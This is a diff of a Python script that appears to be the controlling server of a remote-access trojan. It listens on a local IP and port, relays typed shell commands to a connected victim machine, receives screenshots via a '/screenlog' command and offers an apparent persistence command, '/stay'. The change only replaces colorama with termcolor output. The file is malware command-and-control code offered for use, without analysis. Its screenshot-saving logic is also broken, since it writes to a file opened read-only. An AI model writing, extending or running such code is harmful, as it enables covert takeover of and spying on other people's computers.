@@ -1,18 +1,19 @@
-import socket, os, threading, colorama
+import socket, os, threading
+from termcolor import colored
 
 IP = "192.168.0.2"
 PORT = 6667
 BUFFER = 1024
-colorama.init()
+
 os.system("cls")
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 server.bind((IP, PORT))
-print("server runing on ip:{0} and port:{1}".format(IP,PORT))
-print("\n to send server commands type: /[command]}")
+print(colored("server runing on ip:{0} and port:{1}".format(IP,PORT), "green"))
+print(colored("\n to send server commands type: /[command]}","red"))
 server.listen(1)
 conn, addr = server.accept()
-print("conn recived from:{0}".format(addr))
+print(colored("conn recived from:{0}".format(addr), "green"))
 if conn:
     while True:
         cmd = input("SHELL> ")
@@ -20,16 +21,16 @@ if conn:
             conn.send("exit".encode("utf-8"))
             break
         if cmd == "/stay":
-            print(colorama.Fore.CYAN + "[/] await the pc start!")
+            print(colored("[/] await the pc start!", "yellow"))
         if cmd == "/screenlog":
             print("[-] awaiting data ...")
             data = conn.recv(BUFFER)
             with open('screenshot.jpg', 'rb') as f:
                 try:
                     f.write(data.decode('utf-8'))
-                    print(colorama.Fore.GREEN + "data recived and photo saved")
+                    print(colored("data recived and photo saved", "green"))
                 except:
-                    print(colorama.Fore.RED + "error to decode the img!")
+                    print(colored("error to decode the img!","red"))
         conn.send((cmd).encode('utf-8'))
         output = conn.recv(BUFFER).decode('utf-8')
         print(output)
